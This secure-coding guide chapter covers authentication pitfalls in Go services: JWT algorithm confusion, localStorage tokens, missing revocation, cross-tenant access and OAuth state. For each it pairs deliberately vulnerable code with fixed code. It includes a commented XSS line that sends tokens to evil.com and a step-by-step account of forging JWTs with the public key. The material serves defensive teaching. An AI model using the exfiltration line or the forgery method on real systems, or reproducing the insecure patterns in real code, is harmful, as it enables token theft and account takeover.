## 112.10 Production Pitfalls: Authentication & Authorization Failures

### Pitfall 1: JWT Algorithm Confusion Attacks

**Real Incident Report**: A service accepted JWTs with any algorithm. Attackers changed the algorithm from RS256 to HS256 and signed the token with the public key (which was publicly available), gaining admin access.

**The Anti-Pattern**:
```go
// WRONG: Trusting the algorithm claim in the token
func validateToken(tokenString string) (*Claims, error) {
    token, err := jwt.Parse(tokenString, func(token *jwt.Token) (any, error) {
        // Accepts whatever algorithm the token claims
        if token.Method.Alg() == "HS256" {
            return []byte(hmacSecret), nil
        }
        // Attacker sends RS256 signed with HMAC using public key
        return publicKey, nil
    })
    // ...
}
```

**The Better Approach**:
```go
// RIGHT: Enforce expected algorithm
func validateToken(tokenString string) (*Claims, error) {
    token, err := jwt.ParseWithClaims(tokenString, &Claims{}, func(token *jwt.Token) (any, error) {
        // Defense in depth: the parser already enforces WithValidMethods
        if _, ok := token.Method.(*jwt.SigningMethodRSA); !ok {
            return nil, fmt.Errorf("unexpected signing method: %v", token.Header["alg"])
        }

        // Only RS256 with our specific public key
        return publicKey, nil
    },
        jwt.WithValidMethods([]string{"RS256"}),
        jwt.WithIssuer(expectedIssuer),     // iss validated during parsing
        jwt.WithAudience(expectedAudience), // aud validated during parsing
    )

    if err != nil {
        return nil, fmt.Errorf("token validation failed: %w", err)
    }

    claims, ok := token.Claims.(*Claims)
    if !ok || !token.Valid {
        return nil, errors.New("invalid claims")
    }

    return claims, nil
}
```

**Key Insight**: Never trust the `alg` header in a JWT. Always enforce the expected algorithm and reject tokens with unexpected algorithms.

---

### Pitfall 2: Token Stored in localStorage

**Real Incident Report**: A SPA stored access tokens in localStorage. An XSS vulnerability allowed attackers to steal tokens from thousands of users. Unlike cookies, stolen localStorage tokens worked from any origin.

**The Anti-Pattern**:
```javascript
// Frontend - WRONG: localStorage is accessible to any XSS
const token = response.accessToken;
localStorage.setItem('access_token', token);

// Every XSS can steal this:
// new Image().src = 'https://evil.com/steal?token=' + localStorage.access_token
```

```go
// Backend - WRONG: Returning token in response body
func loginHandler(w http.ResponseWriter, r *http.Request) {
    token := generateToken(user)
    json.NewEncoder(w).Encode(map[string]string{
        "access_token": token, // Client will store in localStorage
    })
}
```

**The Better Approach**:
```go
// RIGHT: HTTP-only cookies for tokens
func loginHandler(w http.ResponseWriter, r *http.Request) {
    token := generateToken(user)

    http.SetCookie(w, &http.Cookie{
        Name:     "access_token",
        Value:    token,
        HttpOnly: true,   // Not accessible via JavaScript
        Secure:   true,   // HTTPS only
        SameSite: http.SameSiteStrictMode,
        Path:     "/",
        MaxAge:   3600,   // 1 hour
    })

    // Return success without exposing token
    json.NewEncoder(w).Encode(map[string]string{
        "status": "logged_in",
    })
}

// For SPA with API: Use BFF (Backend For Frontend) pattern
func bffHandler(w http.ResponseWriter, r *http.Request) {
    // Session cookie identifies user
    session := getSession(r)

    // BFF holds the actual token, never exposed to browser
    apiResponse := callAPI(session.AccessToken, r.URL.Path)

    w.Write(apiResponse)
}
```

**Key Insight**: Tokens in localStorage can be stolen by any XSS. Use HTTP-only cookies or the BFF pattern to keep tokens out of JavaScript's reach.

---

### Pitfall 3: Missing Token Revocation

**Real Incident Report**: A company issued JWTs valid for 24 hours. An admin's token was compromised. They couldn't revoke it because "JWTs are stateless." The attacker had access for the full 24-hour validity period.

**The Anti-Pattern**:
```go
// WRONG: No revocation mechanism
func validateToken(tokenString string) bool {
    token, err := jwt.Parse(tokenString, keyFunc)
    if err != nil {
        return false
    }
    // Just check signature and expiry - no revocation check
    return token.Valid
}

// "JWTs are stateless, we can't revoke them"
func logout(w http.ResponseWriter, r *http.Request) {
    // Just clear the cookie, token still valid!
    http.SetCookie(w, &http.Cookie{Name: "token", MaxAge: -1})
}
```

**The Better Approach**:
```go
// RIGHT: Token revocation with blacklist
type TokenBlacklist struct {
    redis *redis.Client
}

func (b *TokenBlacklist) Revoke(tokenID string, expiry time.Time) error {
    // Store until token's natural expiry
    ttl := time.Until(expiry)
    return b.redis.Set(ctx, "revoked:"+tokenID, "1", ttl).Err()
}

func (b *TokenBlacklist) IsRevoked(tokenID string) bool {
    exists, _ := b.redis.Exists(ctx, "revoked:"+tokenID).Result()
    return exists > 0
}

func validateToken(tokenString string) (*Claims, error) {
    token, err := jwt.Parse(tokenString, keyFunc)
    if err != nil {
        return nil, err
    }

    claims := token.Claims.(*Claims)

    // Check revocation list
    if tokenBlacklist.IsRevoked(claims.ID) {
        return nil, errors.New("token has been revoked")
    }

    return claims, nil
}

func logout(w http.ResponseWriter, r *http.Request) {
    claims := getClaimsFromContext(r.Context())

    // Add to blacklist
    tokenBlacklist.Revoke(claims.ID, claims.ExpiresAt.Time)

    // Clear cookie
    http.SetCookie(w, &http.Cookie{Name: "token", MaxAge: -1})
}

// Alternative: Short-lived tokens with refresh
const (
    accessTokenDuration  = 15 * time.Minute  // Short!
    refreshTokenDuration = 7 * 24 * time.Hour
)

func refreshToken(w http.ResponseWriter, r *http.Request) {
    refreshToken := getRefreshToken(r)

    // Refresh tokens can be revoked from database
    if isRefreshTokenRevoked(refreshToken) {
        http.Error(w, "Unauthorized", http.StatusUnauthorized)
        return
    }

    // Issue new short-lived access token
    newAccessToken := issueAccessToken(refreshToken.UserID)
    setTokenCookie(w, newAccessToken)
}
```

**Key Insight**: "Stateless" JWTs need stateful revocation for security. Use short-lived access tokens (15 minutes) with longer refresh tokens, or maintain a revocation list.

---

### Pitfall 4: Broken Authorization in Multi-Tenant Systems

**Real Incident Report**: A SaaS platform checked user roles but not tenant membership. A user from Tenant A could access Tenant B's data by manipulating API requests. Over 50 companies' data was exposed.

**The Anti-Pattern**:
```go
// WRONG: Only checking role, not tenant
func getDocument(w http.ResponseWriter, r *http.Request) {
    userID := getUserID(r.Context())
    docID := chi.URLParam(r, "id")

    // Check if user has "viewer" role - but which tenant?
    if !hasRole(userID, "viewer") {
        http.Error(w, "Forbidden", http.StatusForbidden)
        return
    }

    // No tenant check! User from Tenant A can access Tenant B's docs
    doc, _ := db.GetDocument(docID)
    json.NewEncoder(w).Encode(doc)
}
```

**The Better Approach**:
```go
// RIGHT: Always enforce tenant isolation
func getDocument(w http.ResponseWriter, r *http.Request) {
    userID := getUserID(r.Context())
    tenantID := getTenantID(r.Context()) // From auth token
    docID := chi.URLParam(r, "id")

    // Check role within tenant context
    if !hasRoleInTenant(userID, tenantID, "viewer") {
        http.Error(w, "Forbidden", http.StatusForbidden)
        return
    }

    // ALWAYS filter by tenant
    doc, err := db.GetDocumentForTenant(docID, tenantID)
    if err != nil {
        http.Error(w, "Not found", http.StatusNotFound)
        return
    }

    json.NewEncoder(w).Encode(doc)
}

// Database layer enforces tenant isolation
func (r *DocumentRepo) GetDocumentForTenant(id, tenantID string) (*Document, error) {
    var doc Document
    err := r.db.QueryRow(
        "SELECT * FROM documents WHERE id = $1 AND tenant_id = $2",
        id, tenantID, // Tenant filter is mandatory
    ).Scan(&doc)
    return &doc, err
}

// Even better: Row-level security in PostgreSQL
/*
CREATE POLICY tenant_isolation ON documents
    USING (tenant_id = current_setting('app.current_tenant')::uuid) - 
ALTER TABLE documents ENABLE ROW LEVEL SECURITY;
*/

func (r *DocumentRepo) SetTenantContext(ctx context.Context, tenantID string) error {
    _, err := r.db.ExecContext(ctx,
        "SET LOCAL app.current_tenant = $1", tenantID)
    return err
}
```

**Key Insight**: In multi-tenant systems, every query must filter by tenant. Use database-level row security as defense in depth.

---

### Pitfall 5: OAuth State Parameter Vulnerabilities

**Real Incident Report**: An OAuth implementation didn't validate the state parameter. Attackers performed CSRF attacks by tricking users into linking their accounts to attacker-controlled OAuth accounts, taking over user profiles.

**The Anti-Pattern**:
```go
// WRONG: No state parameter or weak validation
func oauthCallback(w http.ResponseWriter, r *http.Request) {
    code := r.URL.Query().Get("code")
    // No state validation!

    token, _ := exchangeCode(code)
    createSession(w, token)
}

// WRONG: Predictable state
func startOAuth(w http.ResponseWriter, r *http.Request) {
    state := fmt.Sprintf("%d", time.Now().Unix()) // Predictable!
    redirectURL := fmt.Sprintf("%s?state=%s", oauthURL, state)
    http.Redirect(w, r, redirectURL, http.StatusFound)
}
```

**The Better Approach**:
```go
// RIGHT: Secure state parameter with CSRF protection
type OAuthState struct {
    Token     string    `json:"token"`
    ReturnURL string    `json:"return_url"`
    CreatedAt time.Time `json:"created_at"`
}

func startOAuth(w http.ResponseWriter, r *http.Request) {
    // Generate cryptographically secure state
    stateBytes := make([]byte, 32)
    rand.Read(stateBytes)
    stateToken := base64.RawURLEncoding.EncodeToString(stateBytes)

    state := OAuthState{
        Token:     stateToken,
        ReturnURL: r.URL.Query().Get("return_url"),
        CreatedAt: time.Now(),
    }

    // Store in session (server-side)
    session := getSession(r)
    session.Values["oauth_state"] = state
    session.Save(r, w)

    redirectURL := oauthConfig.AuthCodeURL(stateToken)
    http.Redirect(w, r, redirectURL, http.StatusFound)
}

func oauthCallback(w http.ResponseWriter, r *http.Request) {
    returnedState := r.URL.Query().Get("state")

    // Retrieve expected state from session
    session := getSession(r)
    expectedState, ok := session.Values["oauth_state"].(OAuthState)
    if !ok {
        http.Error(w, "Invalid session", http.StatusBadRequest)
        return
    }

    // Validate state matches
    if subtle.ConstantTimeCompare(
        []byte(returnedState),
        []byte(expectedState.Token),
    ) != 1 {
        http.Error(w, "Invalid state", http.StatusBadRequest)
        return
    }

    // Validate state isn't too old (5 minute window)
    if time.Since(expectedState.CreatedAt) > 5*time.Minute {
        http.Error(w, "State expired", http.StatusBadRequest)
        return
    }

    // Clear used state
    delete(session.Values, "oauth_state")
    session.Save(r, w)

    // Now safe to exchange code
    code := r.URL.Query().Get("code")
    token, err := oauthConfig.Exchange(r.Context(), code)
    // ...
}
```

**Key Insight**: The OAuth state parameter prevents CSRF attacks. It must be cryptographically random, stored server-side, and validated on callback.

---

### Auth Pitfall Quick Reference

| Pitfall | Attack | Fix |
|---------|--------|-----|
| JWT algorithm confusion | Signature bypass | Enforce expected algorithm |
| Tokens in localStorage | XSS token theft | HTTP-only cookies, BFF pattern |
| No token revocation | Persistent compromise | Blacklist or short-lived tokens |
| Missing tenant checks | Cross-tenant access | Always filter by tenant_id |
| Weak OAuth state | Account takeover via CSRF | Cryptographic state, server-side storage |

### Junior → FAANG: Auth Pitfalls Are Exploitable at Every Scale

The pitfalls in this section have been exploited in publicly disclosed incidents. Juniors who can recognize these patterns in code review and name the specific exploit are demonstrating senior-level security awareness.

**Gap to close:** The JWT algorithm confusion attack is the most technically subtle and the most devastating. Know it precisely: if a service accepts both RS256 (asymmetric) and HS256 (symmetric) tokens, an attacker can take a valid RS256 token, change the `alg` header to `HS256`, and re-sign it using the server's RS256 public key as the HS256 secret. The server, not checking the algorithm, accepts the forged token. Prevention: always specify the expected algorithm explicitly when parsing JWTs. Never allow the token itself to dictate the algorithm.

**Interview preparation:** For the JWT algorithm confusion attack, practice explaining it in 60 seconds: "The attacker changes `alg` to `HS256` and signs with the server's public key. The server validates HMAC-SHA256 with its public key, which the attacker also knows. The validation passes but the token is forged." This precise explanation, delivered confidently, signals deep JWT security knowledge.

### Senior @ FAANG: Auth Pitfall Prevention as Policy

At senior level, auth pitfalls are prevented through JWT library selection, mandatory verification configurations, and automated testing.

**Library selection as a security control:** Choose JWT libraries that enforce security by default. Go's `golang-jwt/jwt` v5 requires explicit parser options for algorithm allowlisting: `jwt.NewParser(jwt.WithValidMethods([]string{"RS256"}))`. Libraries that accept any algorithm by default are not acceptable for production use. Document the approved JWT library and the required configuration in your auth platform documentation.

**Auth penetration testing:** Include auth-specific tests in your security testing suite: algorithm confusion attempt (change `alg` header and re-sign with public key), expired token (modify `exp` to past date), invalid audience (change `aud` to a different service), and for multi-tenant systems, cross-tenant token (use a valid token from Tenant A to access Tenant B's resources). These tests should all fail with 401 or 403. Run them on every release.

**OAuth state parameter verification:** The OAuth state parameter prevents CSRF attacks against the OAuth callback endpoint. Use a cryptographically random state, store it server-side (not in a cookie that can be forged), and verify it on callback. Libraries that implement OAuth often do this correctly. Verify that any custom implementation does as well. A missing state check allows an attacker to initiate an OAuth flow and then have the victim complete it, resulting in the attacker's account being linked to the victim's identity provider account.

---
